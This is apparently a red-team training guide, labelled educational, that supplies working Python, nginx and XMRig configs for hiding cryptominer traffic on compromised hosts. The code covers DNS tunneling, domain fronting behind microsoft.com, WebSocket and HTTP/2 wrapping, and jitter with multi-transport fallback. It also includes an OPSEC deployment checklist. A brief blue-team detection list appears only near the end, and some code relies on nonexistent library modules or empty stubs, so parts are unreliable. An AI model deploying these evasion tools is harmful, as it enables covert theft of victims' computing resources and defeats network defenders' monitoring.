# XMRig Network Evasion & C2 Communication

**OSCP Hackathon 2025 - Advanced Network Evasion**

**Purpose**: Demonstrate network-level evasion techniques for covert XMRig C2 communication

**Classification**: Educational - Red Team Training

---

## Table of Contents

1. [Network Evasion Overview](#network-evasion-overview)
2. [DNS Tunneling for Mining Pools](#dns-tunneling-for-mining-pools)
3. [Domain Fronting](#domain-fronting)
4. [Protocol Manipulation](#protocol-manipulation)
5. [Traffic Obfuscation](#traffic-obfuscation)
6. [Multi-Protocol Fallback](#multi-protocol-fallback)
7. [Complete C2 Architecture](#complete-c2-architecture)

---

## Network Evasion Overview

### The Challenge

XMRig mining traffic has distinctive characteristics:
- **Stratum protocol**: Recognizable JSON-RPC over TCP
- **Persistent connections**: Long-lived connections to mining pools
- **Regular patterns**: Periodic share submissions
- **Known ports**: 3333, 4444, 5555 (common mining ports)
- **Pool domains**: Often blacklisted (pool.supportxmr.com, etc.)

### Detection Methods

**Network-Level Detection**:
1. **Port-based blocking**: Block ports 3333, 4444, 5555
2. **Domain blacklists**: Block known pool domains
3. **Deep Packet Inspection (DPI)**: Analyze packet contents for Stratum protocol
4. **Traffic analysis**: Detect regular submission patterns
5. **Certificate inspection**: Identify pool certificates

**Our Evasion Strategy**:
- **DNS tunneling**: Hide traffic in DNS queries
- **Domain fronting**: Use CDN to mask destination
- **Protocol mimicry**: Disguise as legitimate traffic
- **Port forwarding**: Use common ports (80, 443, 53)
- **Traffic randomization**: Break up patterns

---

## DNS Tunneling for Mining Pools

### Concept

**Standard XMRig**:
```
XMRig --> Stratum/TCP:3333 --> pool.supportxmr.com
```

**DNS Tunneled**:
```
XMRig --> DNS Proxy --> DNS Queries --> DNS Server --> Pool
```

### Implementation

#### DNS Tunnel Client (runs on compromised host)

```python
#!/usr/bin/env python3
"""
DNS Tunnel Client for XMRig
Encodes Stratum traffic in DNS queries
"""

import socket
import base64
import dns.resolver
import dns.query
import dns.message
import json
import time

class DNSTunnelClient:
    """Tunnel XMRig traffic through DNS"""

    def __init__(self, dns_server, tunnel_domain):
        self.dns_server = dns_server  # Your controlled DNS server
        self.tunnel_domain = tunnel_domain  # yourdomain.com
        self.buffer_size = 180  # Max DNS label size
        self.session_id = self._generate_session_id()

    def _generate_session_id(self):
        """Generate unique session ID"""
        import hashlib
        import time
        data = f"{time.time()}{socket.gethostname()}".encode()
        return hashlib.md5(data).hexdigest()[:8]

    def encode_data(self, data):
        """
        Encode data for DNS query
        Base32 encoding (DNS-safe)
        """
        import base64
        encoded = base64.b32encode(data).decode().lower()
        # Remove padding
        encoded = encoded.rstrip('=')
        return encoded

    def decode_data(self, data):
        """Decode data from DNS response"""
        import base64
        # Add padding back
        padding = (8 - len(data) % 8) % 8
        data += '=' * padding
        return base64.b32decode(data.upper())

    def chunk_data(self, data):
        """Split data into DNS-safe chunks"""
        encoded = self.encode_data(data)
        chunks = []

        # Split into chunks that fit DNS labels
        chunk_size = 60  # Conservative size
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i+chunk_size]
            chunks.append(chunk)

        return chunks

    def send_query(self, data_chunk, seq_num, total_chunks):
        """
        Send DNS query with tunneled data

        Query format:
        <session>.<seq>.<total>.<data>.<domain>

        Example:
        a1b2c3d4.001.003.n5xw6zlnfq.tunnel.example.com
        """

        # Construct DNS query
        query_name = f"{self.session_id}.{seq_num:03d}.{total_chunks:03d}.{data_chunk}.{self.tunnel_domain}"

        try:
            # Create DNS query
            query = dns.message.make_query(query_name, dns.rdatatype.TXT)

            # Send to DNS server
            response = dns.query.udp(query, self.dns_server, timeout=5)

            # Extract response data from TXT record
            if response.answer:
                for answer in response.answer:
                    for item in answer.items:
                        if item.rdtype == dns.rdatatype.TXT:
                            txt_data = b''.join(item.strings).decode()
                            return self.decode_data(txt_data)

            return None

        except Exception as e:
            print(f"[!] DNS query error: {e}")
            return None

    def tunnel_stratum_connection(self, pool_host, pool_port):
        """
        Tunnel Stratum protocol through DNS
        Acts as local proxy for XMRig
        """

        # Create local proxy socket
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_socket.bind(('127.0.0.1', 3333))
        proxy_socket.listen(1)

        print(f"[*] DNS Tunnel Proxy listening on 127.0.0.1:3333")
        print(f"[*] Tunneling to {pool_host}:{pool_port} via DNS")
        print(f"[*] DNS Server: {self.dns_server}")
        print(f"[*] Session ID: {self.session_id}")

        while True:
            # Accept XMRig connection
            client_socket, addr = proxy_socket.accept()
            print(f"[+] XMRig connected from {addr}")

            # Handle connection
            self._handle_client(client_socket, pool_host, pool_port)

    def _handle_client(self, client_socket, pool_host, pool_port):
        """Handle individual XMRig connection"""

        try:
            while True:
                # Receive data from XMRig
                data = client_socket.recv(4096)
                if not data:
                    break

                print(f"[→] Sending {len(data)} bytes through DNS tunnel")

                # Split into chunks
                chunks = self.chunk_data(data)

                # Send each chunk via DNS
                for i, chunk in enumerate(chunks):
                    response = self.send_query(chunk, i, len(chunks))
                    if response:
                        # Send response back to XMRig
                        client_socket.sendall(response)

                    # Rate limiting to avoid detection
                    time.sleep(0.1)

        except Exception as e:
            print(f"[!] Connection error: {e}")
        finally:
            client_socket.close()

# Usage
client = DNSTunnelClient(
    dns_server='8.8.8.8',  # Your controlled DNS server
    tunnel_domain='tunnel.yourdomain.com'
)

# Start tunnel proxy
client.tunnel_stratum_connection('pool.supportxmr.com', 3333)
```

#### DNS Tunnel Server (runs on attacker-controlled server)

```python
#!/usr/bin/env python3
"""
DNS Tunnel Server
Receives DNS queries, forwards to mining pool
"""

import dns.server
import dns.query
import socket
import base64

class DNSTunnelServer(dns.server.DNSServer):
    """DNS server that forwards queries to mining pool"""

    def __init__(self, pool_host, pool_port):
        self.pool_host = pool_host
        self.pool_port = pool_port
        self.sessions = {}  # Track active sessions

    def handle_query(self, data, addr):
        """Handle incoming DNS query"""

        # Parse query
        query = dns.message.from_wire(data)
        qname = str(query.question[0].name)

        # Extract tunneled data
        parts = qname.split('.')

        if len(parts) >= 5:
            session_id = parts[0]
            seq_num = int(parts[1])
            total_chunks = int(parts[2])
            data_chunk = parts[3]

            # Decode data
            decoded = self.decode_data(data_chunk)

            # Forward to pool
            response_data = self.forward_to_pool(decoded)

            # Encode response
            encoded_response = self.encode_data(response_data)

            # Create DNS response
            response = self.create_txt_response(query, encoded_response)

            return response.to_wire()

    def forward_to_pool(self, data):
        """Forward decoded data to real mining pool"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.pool_host, self.pool_port))
            sock.sendall(data)

            response = sock.recv(4096)
            sock.close()

            return response

        except Exception as e:
            print(f"[!] Pool connection error: {e}")
            return b''

    def encode_data(self, data):
        """Encode for DNS TXT record"""
        return base64.b32encode(data).decode().lower().rstrip('=')

    def decode_data(self, data):
        """Decode from DNS query"""
        padding = (8 - len(data) % 8) % 8
        return base64.b32decode((data + '=' * padding).upper())

# Run server
server = DNSTunnelServer('pool.supportxmr.com', 3333)
server.listen(53, '0.0.0.0')
```

### XMRig Configuration for DNS Tunnel

```json
{
    "pools": [
        {
            "url": "127.0.0.1:3333",
            "user": "YOUR_WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
```

XMRig connects to local proxy (127.0.0.1:3333), which tunnels through DNS!

---

## Domain Fronting

### Concept

Use CDN (Cloudflare, Azure, AWS) to hide true destination.

**Without Domain Fronting**:
```
XMRig --> TLS connection --> pool.supportxmr.com (blocked!)
```

**With Domain Fronting**:
```
XMRig --> TLS SNI: legitimate.com --> CDN --> pool.supportxmr.com
         (firewall sees legitimate.com)
```

### Cloudflare Domain Fronting Setup

**Prerequisites**:
1. Cloudflare account
2. Domain with Cloudflare DNS
3. Reverse proxy on your server

**Step 1: Setup Reverse Proxy on Your Server**

```nginx
# /etc/nginx/sites-available/xmrig-proxy
server {
    listen 443 ssl http2;
    server_name your-fronted-domain.com;

    ssl_certificate /etc/letsencrypt/live/your-fronted-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-fronted-domain.com/privkey.pem;

    # Proxy to real mining pool
    location /mining {
        proxy_pass https://pool.supportxmr.com:443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host pool.supportxmr.com;
    }
}
```

**Step 2: Cloudflare Configuration**

```
1. Add A record: your-fronted-domain.com -> your-server-ip
2. Enable Cloudflare proxy (orange cloud)
3. SSL/TLS mode: Full (strict)
```

**Step 3: XMRig Configuration**

```json
{
    "pools": [
        {
            "url": "your-fronted-domain.com:443",
            "user": "YOUR_WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": true
        }
    ]
}
```

**Step 4: Client-Side Domain Fronting Script**

```python
#!/usr/bin/env python3
"""
Domain Fronting Proxy for XMRig
Connects to CDN with legitimate SNI, routes to real pool
"""

import socket
import ssl

class DomainFrontingProxy:
    def __init__(self, cdn_host, fronted_domain, real_pool):
        self.cdn_host = cdn_host  # cdn.cloudflare.com
        self.fronted_domain = fronted_domain  # your-domain.com
        self.real_pool = real_pool  # pool.supportxmr.com

    def create_fronted_connection(self):
        """
        Create TLS connection with domain fronting
        SNI: legitimate domain
        Host header: real pool
        """

        # Create TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to CDN
        sock.connect((self.cdn_host, 443))

        # Wrap with TLS using legitimate SNI
        context = ssl.create_default_context()
        tls_sock = context.wrap_socket(
            sock,
            server_hostname=self.fronted_domain  # Legitimate domain!
        )

        # Send HTTP CONNECT to real pool
        connect_req = f"CONNECT {self.real_pool}:443 HTTP/1.1\\r\\n"
        connect_req += f"Host: {self.real_pool}\\r\\n"
        connect_req += "\\r\\n"

        tls_sock.sendall(connect_req.encode())

        # Receive CONNECT response
        response = tls_sock.recv(4096)

        if b'200 Connection established' in response:
            print("[+] Domain fronting successful!")
            return tls_sock
        else:
            print("[!] Domain fronting failed")
            return None

# Usage
proxy = DomainFrontingProxy(
    cdn_host='cloudflare.com',
    fronted_domain='www.microsoft.com',  # High-trust domain
    real_pool='pool.supportxmr.com'
)

connection = proxy.create_fronted_connection()
```

---

## Protocol Manipulation

### HTTP/2 Multiplexing

**Disguise Stratum as HTTP/2 traffic**

```python
#!/usr/bin/env python3
"""
Wrap Stratum in HTTP/2
Looks like web browsing to DPI
"""

import socket
import h2.connection
import h2.events

class HTTP2StratumProxy:
    def __init__(self, pool_host, pool_port):
        self.pool_host = pool_host
        self.pool_port = pool_port

    def wrap_in_http2(self, stratum_data):
        """Encapsulate Stratum in HTTP/2 POST"""

        # Create HTTP/2 connection
        h2_conn = h2.connection.H2Connection()
        h2_conn.initiate_connection()

        # Send Stratum data as HTTP/2 POST
        stream_id = h2_conn.get_next_available_stream_id()
        h2_conn.send_headers(
            stream_id,
            [
                (':method', 'POST'),
                (':path', '/api/submit'),
                (':scheme', 'https'),
                (':authority', self.pool_host),
                ('content-type', 'application/json'),
            ]
        )

        # Send Stratum payload
        h2_conn.send_data(stream_id, stratum_data)
        h2_conn.end_stream(stream_id)

        return h2_conn.data_to_send()
```

### WebSocket Tunneling

**Encapsulate Stratum in WebSocket**

```python
#!/usr/bin/env python3
"""
WebSocket proxy for XMRig
Looks like legitimate WebSocket app
"""

import asyncio
import websockets
import socket

class WebSocketStratumProxy:
    def __init__(self, pool_host, pool_port):
        self.pool_host = pool_host
        self.pool_port = pool_port

    async def proxy_handler(self, websocket, path):
        """Handle WebSocket connection from XMRig"""

        # Connect to real pool
        pool_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        pool_sock.connect((self.pool_host, self.pool_port))

        # Bidirectional forwarding
        async def forward_to_pool():
            async for message in websocket:
                pool_sock.sendall(message.encode())

        async def forward_from_pool():
            while True:
                data = pool_sock.recv(4096)
                if not data:
                    break
                await websocket.send(data.decode())

        # Run both directions concurrently
        await asyncio.gather(
            forward_to_pool(),
            forward_from_pool()
        )

    def start_proxy(self, listen_port=8080):
        """Start WebSocket proxy"""
        start_server = websockets.serve(
            self.proxy_handler,
            '127.0.0.1',
            listen_port
        )

        print(f"[*] WebSocket proxy listening on ws://127.0.0.1:{listen_port}")
        asyncio.get_event_loop().run_until_complete(start_server)
        asyncio.get_event_loop().run_forever()

# Usage
proxy = WebSocketStratumProxy('pool.supportxmr.com', 3333)
proxy.start_proxy()
```

---

## Traffic Obfuscation

### TLS with Custom Ciphers

```python
import ssl

def create_obfuscated_tls_context():
    """Create TLS context that mimics web browser"""

    context = ssl.create_default_context()

    # Use browser-like cipher suite
    context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:!aNULL:!MD5')

    # Enable modern TLS features
    context.options |= ssl.OP_NO_SSLv2
    context.options |= ssl.OP_NO_SSLv3
    context.options |= ssl.OP_NO_TLSv1
    context.options |= ssl.OP_NO_TLSv1_1

    # Mimic browser behavior
    context.check_hostname = True
    context.verify_mode = ssl.CERT_REQUIRED

    return context
```

### Traffic Padding

```python
def add_random_padding(data):
    """Add random padding to defeat traffic analysis"""
    import random

    padding_size = random.randint(100, 500)
    padding = bytes([random.randint(0, 255) for _ in range(padding_size)])

    # Add padding marker
    padded = data + b'|PAD|' + padding

    return padded

def remove_padding(data):
    """Remove padding from received data"""
    if b'|PAD|' in data:
        return data.split(b'|PAD|')[0]
    return data
```

### Jitter & Timing Randomization

```python
import time
import random

def send_with_jitter(sock, data):
    """Send data with random timing to avoid pattern detection"""

    # Split into chunks
    chunk_size = random.randint(64, 256)

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        sock.sendall(chunk)

        # Random delay
        jitter = random.uniform(0.01, 0.1)
        time.sleep(jitter)
```

---

## Multi-Protocol Fallback

### Cascading Pool Configuration

```json
{
    "pools": [
        {
            "url": "your-domain.com:443",
            "user": "WALLET",
            "pass": "x",
            "keepalive": true,
            "tls": true,
            "priority": 1
        },
        {
            "url": "doh://dns-tunnel.example.com",
            "user": "WALLET",
            "pass": "x",
            "priority": 2
        },
        {
            "url": "ws://websocket-proxy.example.com:8080",
            "user": "WALLET",
            "pass": "x",
            "priority": 3
        },
        {
            "url": "pool.supportxmr.com:443",
            "user": "WALLET",
            "pass": "x",
            "tls": true,
            "priority": 4
        }
    ]
}
```

### Automatic Fallback Logic

```python
class MultiProtocolMiner:
    """Try multiple protocols in order"""

    def __init__(self, pool_configs):
        self.pools = sorted(pool_configs, key=lambda x: x['priority'])

    def connect(self):
        """Try each pool in priority order"""

        for pool in self.pools:
            print(f"[*] Trying {pool['url']}...")

            try:
                if pool['url'].startswith('doh://'):
                    conn = self.connect_dns_tunnel(pool)
                elif pool['url'].startswith('ws://'):
                    conn = self.connect_websocket(pool)
                elif pool['url'].startswith('https://'):
                    conn = self.connect_domain_fronting(pool)
                else:
                    conn = self.connect_direct(pool)

                if conn:
                    print(f"[+] Connected via {pool['url']}")
                    return conn

            except Exception as e:
                print(f"[!] Failed: {e}")
                continue

        print("[!] All connection methods failed")
        return None
```

---

## Complete C2 Architecture

### Layered Network Stack

```
┌─────────────────────────────────────────────────────────────┐
│  XMRig (Mining Software)                                    │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│  Local Proxy Layer (127.0.0.1:3333)                        │
│  - Protocol translation                                      │
│  - Traffic obfuscation                                       │
│  - Automatic fallback                                        │
└────────────────────┬────────────────────────────────────────┘
                     │
        ┌────────────┴───────────┬────────────┐
        ▼                        ▼            ▼
┌───────────────┐  ┌──────────────────┐  ┌──────────────┐
│ DNS Tunnel    │  │ Domain Fronting  │  │ WebSocket    │
│ (Port 53)     │  │ (CDN)            │  │ (Port 443)   │
└───────┬───────┘  └────────┬─────────┘  └──────┬───────┘
        │                   │                    │
        └───────────────────┴────────────────────┘
                            │
                            ▼
              ┌──────────────────────────┐
              │ Your C2 Server           │
              │ (Reverse Proxy)          │
              └──────────┬───────────────┘
                         │
                         ▼
              ┌──────────────────────────┐
              │ Real Mining Pool         │
              │ (pool.supportxmr.com)    │
              └──────────────────────────┘
```

### Complete Python Implementation

```python
#!/usr/bin/env python3
"""
Complete Network Evasion Stack for XMRig
Combines all techniques
"""

import socket
import asyncio
import dns.query
from enum import Enum

class TransportType(Enum):
    DNS_TUNNEL = 1
    DOMAIN_FRONTING = 2
    WEBSOCKET = 3
    DIRECT = 4

class EvasiveXMRigProxy:
    """
    Complete evasive proxy for XMRig
    Automatically selects best transport method
    """

    def __init__(self, config):
        self.config = config
        self.transports = []

        # Initialize available transports
        if config.get('dns_tunnel'):
            self.transports.append(TransportType.DNS_TUNNEL)
        if config.get('domain_fronting'):
            self.transports.append(TransportType.DOMAIN_FRONTING)
        if config.get('websocket'):
            self.transports.append(TransportType.WEBSOCKET)

        # Always have direct as fallback
        self.transports.append(TransportType.DIRECT)

    def start(self):
        """Start proxy server"""

        proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_sock.bind(('127.0.0.1', 3333))
        proxy_sock.listen(5)

        print("[*] Evasive XMRig Proxy Started")
        print(f"[*] Available transports: {[t.name for t in self.transports]}")
        print("[*] Listening on 127.0.0.1:3333")

        while True:
            client_sock, addr = proxy_sock.accept()
            print(f"[+] XMRig connected from {addr}")

            # Handle connection with automatic transport selection
            self.handle_connection(client_sock)

    def handle_connection(self, client_sock):
        """Handle XMRig connection with transport fallback"""

        for transport in self.transports:
            try:
                print(f"[*] Trying {transport.name}...")

                if transport == TransportType.DNS_TUNNEL:
                    success = self.use_dns_tunnel(client_sock)
                elif transport == TransportType.DOMAIN_FRONTING:
                    success = self.use_domain_fronting(client_sock)
                elif transport == TransportType.WEBSOCKET:
                    success = self.use_websocket(client_sock)
                else:
                    success = self.use_direct(client_sock)

                if success:
                    print(f"[+] Successfully connected via {transport.name}")
                    return

            except Exception as e:
                print(f"[!] {transport.name} failed: {e}")
                continue

        print("[!] All transport methods failed")
        client_sock.close()

    def use_dns_tunnel(self, client_sock):
        """Implement DNS tunnel transport"""
        # Implementation from earlier
        pass

    def use_domain_fronting(self, client_sock):
        """Implement domain fronting transport"""
        # Implementation from earlier
        pass

    def use_websocket(self, client_sock):
        """Implement WebSocket transport"""
        # Implementation from earlier
        pass

    def use_direct(self, client_sock):
        """Direct connection (fallback)"""
        pool_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        pool_sock.connect((self.config['pool_host'], self.config['pool_port']))

        # Bidirectional forwarding
        while True:
            data = client_sock.recv(4096)
            if not data:
                break
            pool_sock.sendall(data)

            response = pool_sock.recv(4096)
            if not response:
                break
            client_sock.sendall(response)

        pool_sock.close()
        return True

# Configuration
config = {
    'pool_host': 'pool.supportxmr.com',
    'pool_port': 443,
    'dns_tunnel': {
        'server': '8.8.8.8',
        'domain': 'tunnel.example.com'
    },
    'domain_fronting': {
        'cdn': 'cloudflare.com',
        'fronted_domain': 'www.microsoft.com'
    },
    'websocket': {
        'url': 'ws://proxy.example.com:8080'
    }
}

# Start proxy
proxy = EvasiveXMRigProxy(config)
proxy.start()
```

---

## Deployment Guide

### Setup Checklist

**Infrastructure**:
- [ ] DNS server (for DNS tunneling)
- [ ] Cloudflare account (for domain fronting)
- [ ] VPS for reverse proxy
- [ ] Domain name

**Configuration**:
- [ ] DNS server configured with tunnel domain
- [ ] Cloudflare proxy enabled
- [ ] Nginx reverse proxy setup
- [ ] SSL certificates installed

**Testing**:
- [ ] Test DNS tunnel in isolation
- [ ] Verify domain fronting works
- [ ] Test fallback mechanisms
- [ ] Monitor traffic patterns

**OPSEC**:
- [ ] Use legitimate-looking domains
- [ ] Implement traffic randomization
- [ ] Add jitter to avoid patterns
- [ ] Monitor for detection

---

## Detection & Defense

### Blue Team Detection Points

**DNS Tunnel Detection**:
- Unusual DNS query volumes
- Long TXT record responses
- Base32-encoded subdomains
- Regular query patterns

**Domain Fronting Detection**:
- SNI/Host header mismatches
- Unusual TLS negotiation patterns
- Traffic to uncommon CDN endpoints

**WebSocket Detection**:
- WebSocket traffic to non-web destinations
- Binary data in WebSocket frames
- Regular update patterns

### Defensive Recommendations

1. **DNS Monitoring**: Alert on high-volume DNS queries
2. **TLS Inspection**: Compare SNI vs actual destination
3. **Behavioral Analysis**: Detect regular submission patterns
4. **Baseline Network Traffic**: Identify anomalies
5. **Block Known Pools**: Maintain pool domain blacklist

---

## Conclusion

Network-level evasion transforms XMRig from easily-blocked to extremely difficult to detect. By combining multiple transport methods with automatic fallback, the miner maintains connectivity even when individual methods are blocked.

**Key Takeaways**:
- Multiple transport methods increase resilience
- DNS tunneling bypasses most firewalls
- Domain fronting hides true destination
- Traffic obfuscation defeats pattern detection
- Automatic fallback ensures persistence

**For Red Team**: These techniques demonstrate advanced C2 capabilities
**For Blue Team**: Understanding these methods improves detection strategies

---

**Document Version**: 1.0
**Last Updated**: 2025-10-02
**Classification**: Educational - Authorized Testing Only
